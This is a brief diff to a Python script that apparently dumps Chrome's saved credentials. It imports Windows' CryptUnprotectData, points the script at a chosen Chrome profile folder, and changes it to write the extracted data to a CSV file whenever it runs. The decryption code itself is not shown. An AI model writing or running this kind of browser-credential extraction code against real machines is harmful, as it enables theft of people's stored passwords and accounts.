@@ -8,9 +8,11 @@ from win32crypt import CryptUnprotectData
 import argparse
 
 
+
 def chromepath():
+    user_folder='Profile 1'  # Default or Profile 1 or Profile 2
     PathName = os.getenv('localappdata') + \
-        '\\Google\\Chrome\\User Data\\Default\\'
+        '\\Google\\Chrome\\User Data\\' + user_folder +'\\'
     if (os.path.isdir(PathName) is False):
         print('Chrome not found')
         exit(0)
@@ -74,8 +76,8 @@ def args_parser():
         for data in main():
             print(data)
 
-if __name__ == '__main__':
-    args_parser()
+# if __name__ == '__main__':
+#     args_parser()
 
 
-main()
+csv(main())
